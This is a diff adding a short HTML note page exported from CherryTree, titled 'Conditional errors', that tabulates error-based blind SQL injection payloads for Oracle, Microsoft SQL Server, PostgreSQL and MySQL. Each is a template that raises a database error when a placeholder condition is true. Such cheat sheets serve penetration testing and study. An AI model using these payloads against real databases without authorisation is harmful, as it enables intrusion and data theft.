@@ -1,0 +1,8 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Conditional errors</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles2.css" type="text/css" />
+</head>
+<body><h1><b><u>Conditional errors</u></b></h1>You can test a single boolean condition and trigger a database error if the condition is true.<br /><table class="table"><col/><col/><tr><th>Database</th><th>Syntax</th></tr><tr><td>Oracle</td><td>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual</td></tr><tr><td>Microsoft</td><td>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</td></tr><tr><td>PostgreSQL</td><td>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END</td></tr><tr><td>MySQL</td><td>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')</td></tr></table><br /></body></html>
